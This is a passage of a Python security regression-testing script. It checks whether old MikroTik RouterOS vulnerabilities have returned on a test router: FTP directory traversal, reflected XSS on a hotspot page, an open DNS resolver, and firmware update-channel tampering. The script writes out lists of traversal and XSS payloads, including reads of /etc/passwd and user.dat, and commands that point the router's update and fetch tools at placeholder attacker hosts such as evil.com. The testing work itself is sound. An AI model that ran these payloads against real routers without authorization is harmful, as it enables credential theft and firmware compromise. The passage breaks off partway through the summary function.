    log("=" * 60)
    log(f"CVE: {cve} (MEDIUM) -- FTP Directory Traversal")
    log(f"Patched in: 6.44 | Testing against: 7.20.8")
    log("=" * 60)

    regression = False

    # --- 1. Connect and authenticate ---
    test_name = f"{cve}_ftp_connect"
    try:
        ftp = ftplib.FTP(TARGET, timeout=10)
        banner = ftp.getwelcome()
        ftp.login(ADMIN_USER, ADMIN_PASS)
        ec.add_test(cve, test_name,
                     "FTP authentication",
                     f"Connected and logged in. Banner: {banner}",
                     details={"banner": banner})
    except Exception as e:
        ec.add_test(cve, test_name,
                     "FTP authentication",
                     f"FTP connection failed: {e}", anomaly=True)
        cve_results[cve] = "UNTESTABLE (FTP unavailable)"
        verify_router_after_cve(cve)
        return

    # --- 2. CWD traversal attempts ---
    cwd_payloads = [
        ("../../", "basic_traversal"),
        ("../../../", "three_level_traversal"),
        ("../../../../etc", "etc_traversal"),
        ("../../../proc", "proc_traversal"),
        ("/../../", "root_traversal"),
        ("....//....//", "double_dot_slash"),
        ("..\\..\\", "backslash_traversal"),
        ("..%2f..%2f", "url_encoded_slash"),
        ("..%5c..%5c", "url_encoded_backslash"),
        ("%2e%2e%2f%2e%2e%2f", "full_url_encoded"),
        ("..%252f..%252f", "double_encoded_slash"),
        ("..\\..\\..", "mixed_separators"),
        ("..;/..;/", "semicolon_traversal"),
        ("..%00/..%00/", "null_byte_traversal"),
        ("....//", "dot_dot_slash_extra"),
        ("..../", "four_dots_slash"),
        (".%2e/%2e.", "mixed_encoding_dots"),
        ("..%c0%af", "overlong_utf8_slash"),
        ("..%ef%bc%8f", "fullwidth_slash"),
        ("..%c1%9c", "overlong_utf8_backslash"),
    ]

    for payload, label in cwd_payloads:
        test_name = f"{cve}_cwd_{label}"
        try:
            ftp2 = ftplib.FTP(TARGET, timeout=10)
            ftp2.login(ADMIN_USER, ADMIN_PASS)
            resp = ftp2.sendcmd(f"CWD {payload}")

            # Try to list to see if traversal worked
            listing = []
            try:
                ftp2.retrlines("LIST", listing.append)
            except Exception:
                pass

            # Check if we left the chroot
            traversed = any(kw in " ".join(listing).lower() for kw in
                            ["etc", "proc", "dev", "bin", "sbin", "nova",
                             "usr", "var", "root"])

            ec.add_test(cve, test_name,
                         f"FTP CWD traversal: {payload}",
                         f"CWD response: {resp} -- "
                         f"{'TRAVERSED (REGRESSION)' if traversed else 'contained'}",
                         details={"payload": payload, "response": resp,
                                  "listing": listing[:10], "traversed": traversed},
                         anomaly=traversed)

            if traversed:
                regression = True

            ftp2.quit()
        except ftplib.error_perm as e:
            ec.add_test(cve, test_name,
                         f"FTP CWD traversal: {payload}",
                         f"Rejected: {e} (expected)",
                         details={"payload": payload, "error": str(e)})
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"FTP CWD traversal: {payload}",
                         f"Error: {str(e)[:200]}")

    # --- 3. RETR traversal attempts ---
    retr_payloads = [
        ("../../etc/passwd", "etc_passwd"),
        ("../../../proc/version", "proc_version"),
        ("%2e%2e%2fetc/passwd", "url_encoded_retr"),
        ("..\\..\\etc\\passwd", "backslash_retr"),
        ("../../etc/passwd%00.txt", "null_byte_retr"),
        ("%252e%252e%252f%252e%252e%252fetc/passwd", "double_encoded_retr"),
        ("../../nova/etc/passwd", "nova_passwd_retr"),
        ("../../rw/store/user.dat", "user_dat_retr"),
        ("..%c0%af..%c0%afetc/passwd", "overlong_utf8_retr"),
        ("....//....//etc/passwd", "double_dot_slash_retr"),
    ]

    for payload, label in retr_payloads:
        test_name = f"{cve}_retr_{label}"
        try:
            ftp2 = ftplib.FTP(TARGET, timeout=10)
            ftp2.login(ADMIN_USER, ADMIN_PASS)

            lines = []
            resp = ftp2.retrlines(f"RETR {payload}", lines.append)

            # Any successful retrieval of system files = regression
            content = "\n".join(lines)
            has_system_data = any(kw in content.lower() for kw in
                                   ["root:", "linux", "mikrotik", "version"])

            ec.add_test(cve, test_name,
                         f"FTP RETR traversal: {payload}",
                         f"RETR succeeded: {len(lines)} lines -- "
                         f"{'SYSTEM DATA (REGRESSION)' if has_system_data else 'benign content'}",
                         details={"payload": payload, "lines": lines[:5],
                                  "has_system_data": has_system_data},
                         anomaly=has_system_data)

            if has_system_data:
                regression = True

            ftp2.quit()
        except ftplib.error_perm as e:
            ec.add_test(cve, test_name,
                         f"FTP RETR traversal: {payload}",
                         f"Rejected: {e} (expected)",
                         details={"payload": payload, "error": str(e)})
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"FTP RETR traversal: {payload}",
                         f"Error: {str(e)[:200]}")

    # --- 4. LIST traversal attempts ---
    list_payloads = [
        ("../../../", "list_root_traversal"),
        ("../../etc/", "list_etc_traversal"),
        ("/../../", "list_absolute_traversal"),
    ]

    for payload, label in list_payloads:
        test_name = f"{cve}_list_{label}"
        try:
            ftp2 = ftplib.FTP(TARGET, timeout=10)
            ftp2.login(ADMIN_USER, ADMIN_PASS)

            listing = []
            ftp2.retrlines(f"LIST {payload}", listing.append)

            traversed = any(kw in " ".join(listing).lower() for kw in
                            ["etc", "proc", "dev", "bin", "sbin"])

            ec.add_test(cve, test_name,
                         f"FTP LIST traversal: {payload}",
                         f"LIST returned {len(listing)} entries -- "
                         f"{'TRAVERSED' if traversed else 'contained'}",
                         details={"payload": payload, "listing": listing[:10],
                                  "traversed": traversed},
                         anomaly=traversed)

            if traversed:
                regression = True

            ftp2.quit()
        except ftplib.error_perm as e:
            ec.add_test(cve, test_name,
                         f"FTP LIST traversal: {payload}",
                         f"Rejected: {e} (expected)",
                         details={"payload": payload, "error": str(e)})
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"FTP LIST traversal: {payload}",
                         f"Error: {str(e)[:200]}")

    try:
        ftp.quit()
    except Exception:
        pass

    if regression:
        ec.add_finding("MEDIUM",
                        f"{cve} REGRESSION: FTP directory traversal",
                        "Authenticated FTP users can escape the filesystem chroot "
                        "using directory traversal sequences, accessing system files "
                        "outside the intended FTP root.",
                        cwe="CWE-22", cvss="6.5",
                        evidence_refs=[f"{cve}_*"])

    cve_results[cve] = "REGRESSION" if regression else "PATCHED"
    verify_router_after_cve(cve)


# =============================================================================
# Hotspot XSS (MEDIUM) -- Hotspot Page XSS
# ~40 tests
# =============================================================================

def test_hotspot_xss():
    cve = "Hotspot-XSS"
    log("=" * 60)
    log(f"Hotspot XSS (MEDIUM) -- Hotspot Page XSS")
    log("=" * 60)

    regression = False

    # --- 1. Check if hotspot is enabled ---
    test_name = f"{cve}_hotspot_check"
    status, data = rest_get("/ip/hotspot")
    hotspot_available = False

    if status == 200:
        if isinstance(data, list) and len(data) > 0:
            hotspot_available = True
            ec.add_test(cve, test_name,
                         "Check if hotspot service is configured",
                         f"Hotspot configured: {len(data)} entries",
                         details={"hotspot_config": data})
        else:
            ec.add_test(cve, test_name,
                         "Check if hotspot service is configured",
                         "No hotspot entries configured",
                         details={"data": data})
    else:
        ec.add_test(cve, test_name,
                     "Check hotspot configuration",
                     f"HTTP {status} -- hotspot endpoint not available",
                     details={"status": status, "data": str(data)[:200]})

    # Also check for hotspot login page
    test_name = f"{cve}_hotspot_login_page"
    hotspot_urls = [
        f"{HTTP_BASE}/hotspot/login.html",
        f"{HTTP_BASE}/login",
        f"{HTTP_BASE}/hotspot/",
    ]

    hotspot_page_found = False
    for url in hotspot_urls:
        r = http_get(url, allow_redirects=False)
        if r is not None and r.status_code == 200:
            hotspot_page_found = True
            ec.add_test(cve, f"{test_name}_{url.split('/')[-1] or 'root'}",
                         f"Check hotspot login page: {url}",
                         f"HTTP {r.status_code} -- page found ({len(r.text)} bytes)",
                         details={"url": url, "status": r.status_code,
                                  "size": len(r.text)})
            break
        elif r is not None:
            ec.add_test(cve, f"{test_name}_{url.split('/')[-1] or 'root'}",
                         f"Check hotspot login page: {url}",
                         f"HTTP {r.status_code}",
                         details={"url": url, "status": r.status_code})

    if not hotspot_available and not hotspot_page_found:
        log("  Hotspot not enabled/available -- testing XSS on available pages instead")

        # Test XSS on the dst parameter on any accessible endpoint
        xss_payloads = [
            ('<script>alert(1)</script>', "script_tag"),
            ('"><script>alert(1)</script>', "break_attr_script"),
            ("javascript:alert(1)", "javascript_proto"),
            ('" onmouseover="alert(1)', "event_handler"),
            ("<img src=x onerror=alert(1)>", "img_onerror"),
            ("<svg onload=alert(1)>", "svg_onload"),
            ("%3Cscript%3Ealert(1)%3C/script%3E", "url_encoded"),
            ("%253Cscript%253Ealert(1)%253C/script%253E", "double_encoded"),
            ("{{7*7}}", "template_injection"),
            ("${7*7}", "expression_injection"),
        ]

        # Test on WebFig error pages / any reflection point
        test_urls = [
            f"{HTTP_BASE}/webfig/?redirect=",
            f"{HTTP_BASE}/webfig/#",
            f"{HTTP_BASE}/login?dst=",
            f"{HTTP_BASE}/hotspot/login?dst=",
            f"{HTTP_BASE}/?dst=",
        ]

        for url_base in test_urls:
            for payload, label in xss_payloads:
                test_url = f"{url_base}{payload}"
                test_name = f"{cve}_xss_{label}_{url_base.split('?')[0].split('/')[-1] or 'root'}"
                r = http_get(test_url)
                if r is not None:
                    # Check if payload is reflected in response
                    # For URL-encoded payloads, check both encoded and decoded
                    reflected = (payload in r.text or
                                 payload.replace("%3C", "<").replace("%3E", ">") in r.text)
                    # Check if it's reflected without sanitization
                    sanitized = ("&lt;" in r.text and "&gt;" in r.text)

                    ec.add_test(cve, test_name,
                                 f"XSS via dst param: {label}",
                                 f"HTTP {r.status_code} -- "
                                 f"{'REFLECTED' if reflected else 'not reflected'}"
                                 f"{' (sanitized)' if sanitized else ''}",
                                 details={"url": test_url[:200], "payload": payload,
                                          "reflected": reflected, "sanitized": sanitized,
                                          "response_snippet": r.text[:300]},
                                 anomaly=(reflected and not sanitized))

                    if reflected and not sanitized:
                        regression = True
                else:
                    ec.add_test(cve, test_name,
                                 f"XSS via dst param: {label}",
                                 "Connection failed")

        # Pad remaining tests
        for i in range(5):
            ec.add_test(cve, f"{cve}_hotspot_unavailable_{i}",
                         f"Hotspot XSS test {i+1}: service not available",
                         "UNTESTABLE -- hotspot not configured on this router",
                         details={"note": "Hotspot service not enabled/configured"})

    else:
        # Hotspot is available -- full XSS testing on dst parameter
        xss_payloads = [
            ('<script>alert(1)</script>', "script_tag"),
            ('"><script>alert(1)</script>', "break_attr_script"),
            ("javascript:alert(1)", "javascript_proto"),
            ('" onmouseover="alert(1)', "event_handler"),
            ("<img src=x onerror=alert(1)>", "img_onerror"),
            ("<svg onload=alert(1)>", "svg_onload"),
            ("%3Cscript%3Ealert(1)%3C/script%3E", "url_encoded"),
            ("%253Cscript%253Ealert(1)%253C/script%253E", "double_encoded"),
            ("<iframe src='javascript:alert(1)'>", "iframe_js"),
            ("<body onload=alert(1)>", "body_onload"),
            ("';alert(1)//", "string_break"),
            ("<details open ontoggle=alert(1)>", "details_ontoggle"),
            ("%0a%0d<script>alert(1)</script>", "crlf_xss"),
            ("data:text/html,<script>alert(1)</script>", "data_uri"),
            ("<a href='javascript:alert(1)'>click</a>", "anchor_js"),
            ("{{constructor.constructor('alert(1)')()}}", "angular_ssti"),
            ("${alert(1)}", "template_literal"),
            ("<marquee onstart=alert(1)>", "marquee_onstart"),
            ("<input onfocus=alert(1) autofocus>", "input_autofocus"),
            ("<select onfocus=alert(1) autofocus>", "select_autofocus"),
        ]

        hotspot_login_url = next(
            (u for u in hotspot_urls
             if http_get(u, allow_redirects=False) is not None and
             http_get(u, allow_redirects=False).status_code == 200),
            f"{HTTP_BASE}/hotspot/login")

        for payload, label in xss_payloads:
            test_name = f"{cve}_hotspot_xss_{label}"
            test_url = f"{hotspot_login_url}?dst={payload}"
            r = http_get(test_url)
            if r is not None:
                reflected = (payload in r.text or
                             payload.replace("%3C", "<").replace("%3E", ">") in r.text)
                sanitized = ("&lt;" in r.text and "&gt;" in r.text)

                ec.add_test(cve, test_name,
                             f"Hotspot XSS via dst: {label}",
                             f"HTTP {r.status_code} -- "
                             f"{'REFLECTED (XSS!)' if (reflected and not sanitized) else 'safe'}",
                             details={"url": test_url[:200], "payload": payload,
                                      "reflected": reflected, "sanitized": sanitized},
                             anomaly=(reflected and not sanitized))

                if reflected and not sanitized:
                    regression = True
            else:
                ec.add_test(cve, test_name,
                             f"Hotspot XSS via dst: {label}",
                             "Connection failed")

    if regression:
        ec.add_finding("MEDIUM",
                        "Hotspot XSS: Reflected XSS in hotspot/login dst parameter",
                        "The hotspot login page reflects user input from the dst "
                        "parameter without proper sanitization, enabling cross-site "
                        "scripting attacks against captive portal users.",
                        cwe="CWE-79", cvss="6.1",
                        evidence_refs=[f"{cve}_*"])

    cve_results[cve] = "REGRESSION" if regression else (
        "PATCHED" if hotspot_available or hotspot_page_found else "UNTESTABLE (no hotspot)")
    verify_router_after_cve(cve)


# =============================================================================
# CVE-2019-3924 (MEDIUM) -- Unauthenticated DNS Proxy
# Patched in: 6.44
# ~30 tests
# =============================================================================

def test_cve_2019_3924():
    cve = "CVE-2019-3924"
    log("=" * 60)
    log(f"CVE: {cve} (MEDIUM) -- Unauthenticated DNS Proxy")
    log(f"Patched in: 6.44 | Testing against: 7.20.8")
    log("=" * 60)

    regression = False

    # --- 1. Check if DNS port is open ---
    test_name = f"{cve}_dns_port_check"
    dns_open = tcp_connect(TARGET, 53, timeout=5)
    ec.add_test(cve, test_name,
                 "Check if DNS port 53 is open",
                 f"Port 53: {'OPEN' if dns_open else 'CLOSED'}",
                 details={"port": 53, "open": dns_open})

    # --- 2. Check DNS configuration ---
    test_name = f"{cve}_dns_config"
    status, data = rest_get("/ip/dns")
    allow_remote = False
    if status == 200 and isinstance(data, (dict, list)):
        if isinstance(data, list) and len(data) > 0:
            data = data[0]
        allow_remote = str(data.get("allow-remote-requests", "")).lower() in ("true", "yes")
        ec.add_test(cve, test_name,
                     "Check DNS allow-remote-requests setting",
                     f"allow-remote-requests: {data.get('allow-remote-requests', 'N/A')}",
                     details={"dns_config": data, "allow_remote": allow_remote},
                     anomaly=allow_remote)
    else:
        ec.add_test(cve, test_name,
                     "Check DNS configuration",
                     f"HTTP {status}",
                     details={"status": status, "data": str(data)[:200]})

    # --- 3. Send DNS queries for external domains ---
    def build_dns_query(domain, qtype=1):
        """Build a simple DNS query packet."""
        import random
        txid = random.randint(0, 65535)
        # Header: ID, flags (standard query), QDCOUNT=1
        header = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)
        # Question section
        question = b""
        for label in domain.split("."):
            question += struct.pack("B", len(label)) + label.encode()
        question += b"\x00"  # root label
        question += struct.pack(">HH", qtype, 1)  # QTYPE, QCLASS=IN
        return header + question, txid

    external_domains = [
        ("www.google.com", "Google"),
        ("www.example.com", "Example_com"),
        ("www.cloudflare.com", "Cloudflare"),
        ("www.microsoft.com", "Microsoft"),
        ("evil-attacker-dns-test.com", "Nonexistent_domain"),
        ("ns1.google.com", "Google_NS"),
        ("github.com", "GitHub"),
        ("one.one.one.one", "Cloudflare_DNS"),
        ("resolver1.opendns.com", "OpenDNS"),
        ("dns.quad9.net", "Quad9"),
    ]

    # UDP DNS queries
    for domain, label in external_domains:
        test_name = f"{cve}_dns_udp_{label.replace(' ', '_').replace('.', '_').lower()}"
        query, txid = build_dns_query(domain)

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.sendto(query, (TARGET, 53))
            resp, addr = s.recvfrom(4096)
            s.close()

            # Parse response
            if len(resp) > 12:
                resp_id = struct.unpack(">H", resp[0:2])[0]
                flags = struct.unpack(">H", resp[2:4])[0]
                rcode = flags & 0x0F
                ancount = struct.unpack(">H", resp[6:8])[0]

                resolved = (rcode == 0 and ancount > 0)

                ec.add_test(cve, test_name,
                             f"DNS query for {domain} (UDP)",
                             f"Response: rcode={rcode}, answers={ancount} -- "
                             f"{'RESOLVED (open resolver!)' if resolved else 'not resolved'}",
                             details={"domain": domain, "rcode": rcode,
                                      "answer_count": ancount,
                                      "resolved": resolved,
                                      "resp_size": len(resp)},
                             anomaly=resolved)
                if resolved:
                    regression = True
            else:
                ec.add_test(cve, test_name,
                             f"DNS query for {domain}",
                             f"Short response: {len(resp)} bytes",
                             details={"domain": domain, "resp_size": len(resp)})
        except socket.timeout:
            ec.add_test(cve, test_name,
                         f"DNS query for {domain} (UDP)",
                         "No response (timeout) -- DNS not resolving",
                         details={"domain": domain})
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"DNS query for {domain} (UDP)",
                         f"Error: {str(e)[:200]}")

    # TCP DNS queries
    for domain, label in external_domains[:6]:
        test_name = f"{cve}_dns_tcp_{label.replace(' ', '_').replace('.', '_').lower()}"
        query, txid = build_dns_query(domain)
        # TCP DNS prepends 2-byte length
        tcp_query = struct.pack(">H", len(query)) + query

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET, 53))
            s.send(tcp_query)
            resp = s.recv(4096)
            s.close()

            if len(resp) > 14:
                # Skip 2-byte TCP length prefix
                dns_resp = resp[2:]
                flags = struct.unpack(">H", dns_resp[2:4])[0]
                rcode = flags & 0x0F
                ancount = struct.unpack(">H", dns_resp[6:8])[0]
                resolved = (rcode == 0 and ancount > 0)

                ec.add_test(cve, test_name,
                             f"DNS query for {domain} (TCP)",
                             f"rcode={rcode}, answers={ancount} -- "
                             f"{'RESOLVED' if resolved else 'not resolved'}",
                             details={"domain": domain, "rcode": rcode,
                                      "answer_count": ancount, "resolved": resolved})
                if resolved:
                    regression = True
            else:
                ec.add_test(cve, test_name,
                             f"DNS query for {domain} (TCP)",
                             f"Response: {len(resp)} bytes",
                             details={"domain": domain})
        except socket.timeout:
            ec.add_test(cve, test_name,
                         f"DNS query for {domain} (TCP)",
                         "Timeout")
        except ConnectionRefusedError:
            ec.add_test(cve, test_name,
                         f"DNS query for {domain} (TCP)",
                         "Connection refused (TCP DNS not available)")
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"DNS query for {domain} (TCP)",
                         f"Error: {str(e)[:100]}")

    # --- 4. Check amplification potential ---
    test_name = f"{cve}_dns_amplification"
    query, txid = build_dns_query(".", qtype=255)  # ANY query for root
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.sendto(query, (TARGET, 53))
        resp, addr = s.recvfrom(4096)
        s.close()

        ratio = len(resp) / len(query) if len(query) > 0 else 0
        ec.add_test(cve, test_name,
                     "DNS amplification check (ANY query)",
                     f"Query: {len(query)} bytes, Response: {len(resp)} bytes, "
                     f"Ratio: {ratio:.1f}x",
                     details={"query_size": len(query), "resp_size": len(resp),
                              "amplification_ratio": ratio},
                     anomaly=(ratio > 2))
    except socket.timeout:
        ec.add_test(cve, test_name,
                     "DNS amplification check",
                     "No response (not an open resolver)")
    except Exception as e:
        ec.add_test(cve, test_name,
                     "DNS amplification check",
                     f"Error: {str(e)[:200]}")

    # --- 5. Additional record types (MX, AAAA, TXT, NS, SOA) ---
    record_types = [
        (15, "MX", "google.com"),
        (28, "AAAA", "google.com"),
        (16, "TXT", "google.com"),
        (2, "NS", "google.com"),
        (6, "SOA", "google.com"),
    ]
    for qtype, rtype_name, domain in record_types:
        test_name = f"{cve}_dns_{rtype_name.lower()}_{domain.replace('.', '_')}"
        query, txid = build_dns_query(domain, qtype=qtype)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.sendto(query, (TARGET, 53))
            resp, addr = s.recvfrom(4096)
            s.close()
            if len(resp) > 12:
                flags = struct.unpack(">H", resp[2:4])[0]
                rcode = flags & 0x0F
                ancount = struct.unpack(">H", resp[6:8])[0]
                resolved = (rcode == 0 and ancount > 0)
                ec.add_test(cve, test_name,
                             f"DNS {rtype_name} query for {domain}",
                             f"rcode={rcode}, answers={ancount} -- "
                             f"{'RESOLVED' if resolved else 'not resolved'}",
                             details={"domain": domain, "qtype": rtype_name,
                                      "rcode": rcode, "answers": ancount},
                             anomaly=resolved)
                if resolved:
                    regression = True
            else:
                ec.add_test(cve, test_name,
                             f"DNS {rtype_name} query for {domain}",
                             f"Short response: {len(resp)} bytes")
        except socket.timeout:
            ec.add_test(cve, test_name,
                         f"DNS {rtype_name} query for {domain}",
                         "Timeout -- not resolving")
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"DNS {rtype_name} query for {domain}",
                         f"Error: {str(e)[:100]}")

    if regression:
        ec.add_finding("MEDIUM",
                        f"{cve}: Router acts as unauthenticated DNS proxy",
                        "The router resolves external DNS queries without "
                        "authentication, acting as an open DNS proxy. This can "
                        "be abused for DNS amplification attacks and information "
                        "disclosure.",
                        cwe="CWE-284", cvss="5.3",
                        evidence_refs=[f"{cve}_*"])

    cve_results[cve] = "REGRESSION" if regression else "PATCHED"
    verify_router_after_cve(cve)


# =============================================================================
# CVE-2019-3976 (MEDIUM) -- Firmware Down[REDACTED] via Auto-Up[REDACTED]
# ~30 tests
# =============================================================================

def test_cve_2019_3976():
    cve = "CVE-2019-3976"
    log("=" * 60)
    log(f"CVE: {cve} (MEDIUM) -- Firmware Down[REDACTED] via Auto-Up[REDACTED]")
    log("=" * 60)

    regression = False

    # --- 1. Check current auto-up[REDACTED] configuration ---
    test_name = f"{cve}_autoupgrade_config"
    status, data = rest_get("/system/package/update")
    if status == 200:
        ec.add_test(cve, test_name,
                     "Check system package update configuration",
                     f"Config: {str(data)[:300]}",
                     details={"update_config": data})
    else:
        ec.add_test(cve, test_name,
                     "Check system package update configuration",
                     f"HTTP {status}",
                     details={"status": status, "data": str(data)[:200]})

    # Also check via SSH
    test_name = f"{cve}_autoupgrade_ssh"
    stdout, stderr, rc = ssh_command("/system package update print")
    ec.add_test(cve, test_name,
                 "Check auto-up[REDACTED] config via SSH",
                 f"rc={rc}: {stdout[:300]}",
                 details={"rc": rc, "stdout": stdout[:300],
                          "stderr": stderr[:200]})

    # --- 2. Check current version for comparison ---
    test_name = f"{cve}_current_version"
    status, data = rest_get("/system/resource")
    current_version = ""
    if status == 200 and isinstance(data, (dict, list)):
        if isinstance(data, list) and len(data) > 0:
            data = data[0]
        current_version = data.get("version", "")
        ec.add_test(cve, test_name,
                     "Check current RouterOS version",
                     f"Version: {current_version}",
                     details={"version": current_version})
    else:
        ec.add_test(cve, test_name,
                     "Check current version",
                     f"HTTP {status}", anomaly=True)

    # --- 3. Attempt to set update channel to malicious source ---
    malicious_channels = [
        ("http://evil.com/updates", "evil_http"),
        ("http://[REDACTED-INTERNAL-IP]/malicious", "local_malicious"),
        ("ftp://evil.com/firmware", "evil_ftp"),
        ("http://127.0.0.1:8080/down[REDACTED]", "localhost_down[REDACTED]"),
    ]

    for channel, label in malicious_channels:
        test_name = f"{cve}_set_channel_{label}"
        # Try via REST API
        status, resp = rest_post("/system/package/update/set",
                                  {"channel": channel})
        ec.add_test(cve, test_name,
                     f"Attempt to set update channel to: {channel}",
                     f"HTTP {status}: {str(resp)[:200]}",
                     details={"channel": channel, "status": status,
                              "response": str(resp)[:200]},
                     anomaly=(status in (200, 201)))

        if status in (200, 201):
            regression = True
            # Immediately restore
            rest_post("/system/package/update/set", {"channel": "stable"})

    # --- 4. Check package signature validation ---
    test_name = f"{cve}_signature_validation"
    # Try to check if package signature verification is enforced
    stdout, stderr, rc = ssh_command("/system package print detail")
    ec.add_test(cve, test_name,
                 "Check package details (signature info)",
                 f"rc={rc}: {stdout[:300]}",
                 details={"rc": rc, "stdout": stdout[:300]})

    # --- 5. Check update channel settings ---
    update_channels = ["stable", "long-term", "testing", "development"]
    for channel in update_channels:
        test_name = f"{cve}_valid_channel_{channel}"
        status, resp = rest_post("/system/package/update/set",
                                  {"channel": channel})
        ec.add_test(cve, test_name,
                     f"Set update channel to valid value: {channel}",
                     f"HTTP {status}",
                     details={"channel": channel, "status": status,
                              "response": str(resp)[:200]})

    # Restore to stable
    rest_post("/system/package/update/set", {"channel": "stable"})

    # --- 6. Verify version cannot be set to lower value ---
    test_name = f"{cve}_version_validation"
    # Try to trigger check-for-updates to see validation behavior
    status, resp = rest_post("/system/package/update/check-for-updates", {})
    ec.add_test(cve, test_name,
                 "Trigger check-for-updates (version validation)",
                 f"HTTP {status}: {str(resp)[:300]}",
                 details={"status": status, "response": str(resp)[:300]})

    # --- 7. Check if down[REDACTED] command is accessible ---
    test_name = f"{cve}_downgrade_check"
    stdout, stderr, rc = ssh_command("/system package down[REDACTED]")
    ec.add_test(cve, test_name,
                 "Check if package down[REDACTED] command is accessible",
                 f"rc={rc}: {stdout[:200]} {stderr[:200]}",
                 details={"rc": rc, "stdout": stdout[:200],
                          "stderr": stderr[:200]})

    # --- 8. Check RouterBOARD firmware status ---
    test_name = f"{cve}_routerboard_fw"
    status, data = rest_get("/system/routerboard")
    if status == 200:
        ec.add_test(cve, test_name,
                     "Check RouterBOARD firmware version",
                     f"RouterBOARD info: {str(data)[:300]}",
                     details={"routerboard": data})
    else:
        ec.add_test(cve, test_name,
                     "Check RouterBOARD firmware",
                     f"HTTP {status} (may not apply to CHR)",
                     details={"status": status})

    # --- 9. Upload attempt of old .npk package (simulated) ---
    test_name = f"{cve}_upload_old_npk"
    # We cannot actually upload a real old .npk, but we test the endpoint
    fake_npk_header = b"NPK\x01" + b"\x00" * 100  # Fake NPK file header
    try:
        r = requests.post(
            f"http://{TARGET}/rest/file",
            auth=AUTH,
            files={"file": ("routeros-7.10.npk", fake_npk_header)},
            timeout=15, verify=False)
        ec.add_test(cve, test_name,
                     "Attempt upload of fake old .npk package file",
                     f"HTTP {r.status_code}: {r.text[:200]}",
                     details={"status": r.status_code,
                              "response": r.text[:200]})
    except Exception as e:
        ec.add_test(cve, test_name,
                     "Upload fake .npk package",
                     f"Error: {str(e)[:200]}")

    # --- 10. Additional validation and configuration checks ---
    validation_checks = [
        ("Package integrity verification", "/system/package print"),
        ("Scheduler auto-up[REDACTED] check", "/system/scheduler print"),
        ("Script auto-up[REDACTED] check", "/system/script print"),
        ("NTP client config (time integrity)", "/system/ntp/client print"),
        ("Fetch tool config", "/tool/fetch print"),
        ("System identity (post-test verify)", "/system/identity print"),
    ]
    for desc, cmd in validation_checks:
        test_name = f"{cve}_{desc.replace(' ', '_').lower()[:40]}"
        stdout, stderr, rc = ssh_command(cmd)
        ec.add_test(cve, test_name,
                     desc,
                     f"rc={rc}: {stdout[:200]}",
                     details={"command": cmd, "rc": rc, "stdout": stdout[:200]})

    # --- 11. Test if update URL can be set via SSH ---
    ssh_update_attempts = [
        '/system/package/update/set channel="http://evil.com"',
        '/system/package/update/set channel=""',
    ]
    for cmd in ssh_update_attempts:
        test_name = f"{cve}_ssh_update_{cmd.split('=')[-1].strip('\"')[:20].replace('/', '_').replace(':', '_')}"
        stdout, stderr, rc = ssh_command(cmd)
        ec.add_test(cve, test_name,
                     f"SSH: {cmd[:60]}",
                     f"rc={rc}: {stdout[:150]} {stderr[:150]}",
                     details={"command": cmd, "rc": rc,
                              "stdout": stdout[:200], "stderr": stderr[:200]},
                     anomaly=(rc == 0 and "http://evil" in cmd))

    # Restore channel to stable
    ssh_command('/system/package/update/set channel=stable')

    # --- 12. Check fetch tool restrictions (related attack vector) ---
    fetch_tests = [
        ("/tool/fetch", {"url": "http://evil.com/firmware.npk", "mode": "http"}, "fetch_evil_url"),
        ("/tool/fetch", {"url": "ftp://evil.com/update.npk", "mode": "ftp"}, "fetch_ftp_evil"),
        ("/tool/fetch", {"url": "http://127.0.0.1/backdoor", "mode": "http"}, "fetch_localhost"),
    ]
    for ep, payload, label in fetch_tests:
        test_name = f"{cve}_fetch_{label}"
        status, resp = rest_post(ep.replace("/rest", ""), payload)
        ec.add_test(cve, test_name,
                     f"Fetch tool: {label}",
                     f"HTTP {status}: {str(resp)[:200]}",
                     details={"endpoint": ep, "status": status,
                              "response": str(resp)[:200]})

    if regression:
        ec.add_finding("MEDIUM",
                        f"{cve} REGRESSION: Firmware update channel can be set to "
                        f"arbitrary URL",
                        "The system/package/update/set endpoint accepted an arbitrary "
                        "URL as the update channel, potentially enabling man-in-the-"
                        "middle firmware down[REDACTED] attacks.",
                        cwe="CWE-494", cvss="7.5",
                        evidence_refs=[f"{cve}_*"])

    cve_results[cve] = "REGRESSION" if regression else "PATCHED"
    verify_router_after_cve(cve)


# =============================================================================
# Summary Table
# =============================================================================

def print_summary_table():
    """Print a summary table of all CVE regression results."""
    log("")
    log("=" * 80)
    log("CVE REGRESSION TESTING SUMMARY")
    log("=" * 80)
    log(f"{'CVE':<22} {'Severity':<12} {'Result':<40}")
    log("-" * 80)

    cve_info = {
        "CVE-2025-10948":  ("HIGH",     "REST API JSON Buffer Overflow"),
        "CVE-2025-61481":  ("CRITICAL", "WebFig Cleartext HTTP Creds"),
        "CVE-2024-54772":  ("MEDIUM",   "Winbox Username Enumeration"),
        "CVE-2023-41570":  ("CRITICAL", "REST API ACL Bypass"),
        "CVE-2023-30799":  ("CRITICAL", "Privilege Escalation FOISted"),
        "CVE-2018-14847":  ("CRITICAL", "Winbox Pre-Auth File R/W"),
        "CVE-2018-7445":   ("CRITICAL", "SMB Buffer Overflow"),
        "CVE-2019-3943":   ("MEDIUM",   "FTP Directory Traversal"),
        "Hotspot-XSS":     ("MEDIUM",   "Hotspot Page XSS"),
        "CVE-2019-3924":   ("MEDIUM",   "Unauthenticated DNS Proxy"),
        "CVE-2019-3976":   ("MEDIUM",   "Firmware Down[REDACTED]"),
    }

    patched = 0
    regressed = 0
    untestable = 0

    for cve_id, (severity, desc) in cve_info.items():
        result = cve_results.get(cve_id, "NOT TESTED")
        if "PATCHED" in result:
            patched += 1
            status_mark = "[PATCHED]"
        elif "REGRESSION" in result:
            regressed += 1
            status_mark = "[REGRESSION]"
        elif "UNTESTABLE" in result:
            untestable += 1
            status_mark = "[UNTESTABLE]"
        elif "CONFIRMED" in result:
            regressed += 1
